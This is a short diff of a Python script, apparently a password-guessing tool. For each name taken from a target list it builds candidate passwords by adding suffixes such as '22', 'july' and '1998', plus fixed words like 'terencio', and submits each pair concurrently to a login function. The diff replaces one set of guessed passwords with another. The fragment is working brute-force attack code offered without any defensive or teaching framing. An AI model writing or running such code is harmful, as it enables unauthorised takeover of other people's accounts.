@@ -215,15 +215,15 @@ def pilih_menu():
                 bb=aa[0].split(' ')
                 for x in bb:
                     litpas=[
-                         str(x) + '10',
-                         str(x) + '11',
-                         str(x) + '12',
-                         str(x) + '13'
+                         str(x) + '22',
+                         str(x) + 'july',
+                         str(x) + '1998',
+                         str(x) + 'gomes'
                          ]
-                    litpas.append('Nahoen')
-                    litpas.append('nahoen')
-                    litpas.append('Hetmalu')
-                    litpas.append('hetmalu')
+                    litpas.append('terencio')
+                    litpas.append('lay')
+                    litpas.append('1998')
+                    litpas.append('terencio')
                     for passw in set(litpas):
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
